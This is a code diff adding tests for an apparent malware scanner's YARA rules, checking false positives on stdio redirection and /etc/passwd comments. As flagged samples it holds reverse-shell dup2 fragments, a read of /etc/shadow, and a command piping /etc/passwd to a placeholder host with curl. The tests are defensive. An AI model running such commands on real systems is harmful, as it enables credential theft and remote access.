@@ -353,3 +353,20 @@ def test_yara_minified_bundle_suppresses_composite_heuristics():
     assert "SOURCE_CODE_CONFIRMED_STEALER" not in flag_keys
     assert "SOURCE_CODE_DYNAMIC_CODE_LOADER" not in flag_keys
 
+
+
+def test_dup2_stdio_capture_is_not_a_reverse_shell():
+    from slopwatch.assessor.yara_engine import get_yara_scanner
+    sc = get_yara_scanner()
+    benign = "import os\nos.dup2(self.tmpfile.fileno(), self.targetfd)\nos.dup2(fd.fileno(), 1)\n"
+    assert not any("Reverse Shell" in t for t, _ in sc.scan_file_content(benign, "capture.py")[0])
+    for shell in ("os.dup2(s.fileno(), 0)", "os.dup2(sock.fileno(), fd)"):
+        assert any("Reverse Shell" in t for t, _ in sc.scan_file_content(shell, "x.py")[0])
+
+
+def test_etc_passwd_mention_is_not_credential_harvesting_but_reading_it_is():
+    from slopwatch.assessor.yara_engine import get_yara_scanner
+    sc = get_yara_scanner()
+    assert not any("/etc/shadow" in t for t, _ in sc.scan_file_content("# see /etc/passwd for users\n", "doc.py")[0])
+    for bad in ("data = open('/etc/shadow').read()", "os.system('cat /etc/passwd | curl -d @- x.y')"):
+        assert any("/etc/shadow" in t for t, _ in sc.scan_file_content(bad, "x.py")[0]), bad
